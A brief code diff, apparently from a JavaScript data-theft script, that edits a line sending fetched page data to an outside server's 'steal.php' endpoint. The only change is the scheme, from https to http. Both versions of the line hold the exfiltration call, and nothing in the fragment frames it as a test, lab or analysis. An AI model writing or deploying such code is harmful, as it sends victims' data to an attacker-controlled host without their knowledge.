@@ -6,7 +6,7 @@
   .then(response => response.text())
   .then(data => {
     console.log("Fetched Data:", data); // Debugging
-    fetch("https://dipeshsadhwani.ct.ws/steal.php?data=" + encodeURIComponent(data))
+    fetch("http://dipeshsadhwani.ct.ws/steal.php?data=" + encodeURIComponent(data))
       .then(() => console.log("Data Sent"))
       .catch(err => console.error("Error sending data:", err));
   })
